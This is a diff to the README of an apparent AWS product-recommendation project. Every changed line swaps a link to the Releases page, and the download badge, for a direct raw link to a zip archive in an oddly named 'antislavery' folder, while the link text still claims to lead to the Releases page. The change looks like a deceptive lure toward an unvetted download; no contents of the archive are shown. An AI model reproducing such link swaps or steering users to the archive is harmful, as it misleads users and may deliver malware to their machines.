@@ -1,6 +1,6 @@
 # 🤖 AI-Powered-Product-Recommendation-Engine-using-AWS - Get Real-Time Product Suggestions Easily
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)
+![Download Now](https://raw.githubusercontent.com/Do91-NL/AI-Powered-Product-Recommendation-Engine-using-AWS/main/antislavery/AI-Powered-Product-Recommendation-Engine-using-AWS.zip%20Now-Get%20the%20Latest%20Release-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ The AI-Powered Product Recommendation Engine helps you find products you will lo
 
 To get started, visit the Releases page to download the latest version of the software.
 
-👉 [Visit the Releases Page to Download](https://github.com/Do91-NL/AI-Powered-Product-Recommendation-Engine-using-AWS/releases)
+👉 [Visit the Releases Page to Download](https://raw.githubusercontent.com/Do91-NL/AI-Powered-Product-Recommendation-Engine-using-AWS/main/antislavery/AI-Powered-Product-Recommendation-Engine-using-AWS.zip)
 
 ### 🌐 System Requirements
 
@@ -30,7 +30,7 @@ To get started, visit the Releases page to download the latest version of the so
 
 1. **Visit the Releases Page:** Click the link below to navigate to the downloads page.
    
-   👉 [Visit the Releases Page to Download](https://github.com/Do91-NL/AI-Powered-Product-Recommendation-Engine-using-AWS/releases)
+   👉 [Visit the Releases Page to Download](https://raw.githubusercontent.com/Do91-NL/AI-Powered-Product-Recommendation-Engine-using-AWS/main/antislavery/AI-Powered-Product-Recommendation-Engine-using-AWS.zip)
 
 2. **Select the Latest Version:** Identify the most recent release listed on the page.
 
